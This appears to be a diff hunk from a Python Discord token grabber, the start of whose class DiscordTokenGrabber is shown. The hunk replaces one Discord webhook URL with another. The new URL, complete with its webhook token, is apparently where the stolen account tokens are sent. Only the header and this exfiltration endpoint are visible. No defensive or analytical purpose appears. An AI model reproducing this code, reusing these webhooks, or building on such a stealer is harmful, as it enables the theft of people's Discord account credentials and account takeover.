@@ -12,7 +12,7 @@ from datetime import datetime
 from urllib.request import Request, urlopen
 from urllib.error import HTTPError
 
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538353192818057228/-a0gYrruzcIyfPZWWw-TeKq3F66R5r-XbmWSLUm_4FXHIvLtx9P_SMJq0bXDLoNLm2aI"
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538378061521883226/U1caRDreoLLjzXoJNaSWjnWv5-IoeonGojmn0euPIEKqmigzpEsP2AhJQb8Ld1jT4PcX"
 
 class DiscordTokenGrabber:
     def __init__(self):
